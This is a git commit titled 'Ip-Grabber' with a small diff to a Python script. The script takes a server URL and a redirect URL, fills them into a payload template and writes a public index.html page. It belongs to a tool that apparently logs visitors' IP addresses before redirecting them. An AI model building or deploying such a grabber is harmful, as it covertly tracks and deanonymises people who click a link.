799cdc462ecc16d28ed3ef6bf7c0619590db59e5
AngeLM <vekimax040609@gmail.com>
2022-02-10 14:36:09 +0000

    Ip-Grabber

--- url_setter.py
+++ url_setter.py
@@ -1,12 +1,12 @@
 
-ngrok_url = input("Ngrok url: ")
+server_url = input("Server url: ")
 redirect_url = input("Redirect url: ")
 
 f = open('payload.txt', 'r')
 text = f.read()
 f.close()
 
-text = text.replace("ngrok_url", ngrok_url)
+text = text.replace("server_url", server_url)
 text = text.replace("redirect_url", redirect_url)
 
 f = open('public/index.html', 'w')
